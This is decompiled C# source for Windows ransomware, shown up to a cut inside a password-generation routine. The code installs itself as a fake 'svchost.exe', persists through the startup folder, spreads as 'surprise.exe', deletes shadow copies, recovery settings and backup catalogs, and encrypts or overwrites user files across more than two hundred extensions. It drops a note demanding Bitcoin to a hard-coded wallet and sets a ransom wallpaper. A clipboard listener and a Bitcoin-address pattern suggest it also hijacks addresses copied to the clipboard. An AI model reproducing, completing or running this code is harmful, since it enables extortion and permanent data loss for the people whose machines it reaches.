using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[13]
	{
		"", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1q8hm78tfl4mkwzd4u9k7rfwzcmqm8d2v0f6g7qm", "", "", "", "", "", "please pay 150 dollars to this address if you want to review your data which is currently encrypted after paying you will receive the decryption key automatically ",
		"if you don't pay your files will disappear forever because I allow a delay of 1 week ", "", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>8KEk8Hwho1fOTUw+ZlASwhPi9dzux4Cun9mIS0Aqgv2gukzkGhwQ9vz2OiU0JPm7/JficK0vEwYLKC9kyf3lCzQfOE577+DbjBNDraGJ9QYNOwMkZ6/NoZDEF4KstMCU6Wm5MqRLf/4vDDcGguNh3vb+Sp/nE7mUPkWQG2g1z2E=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
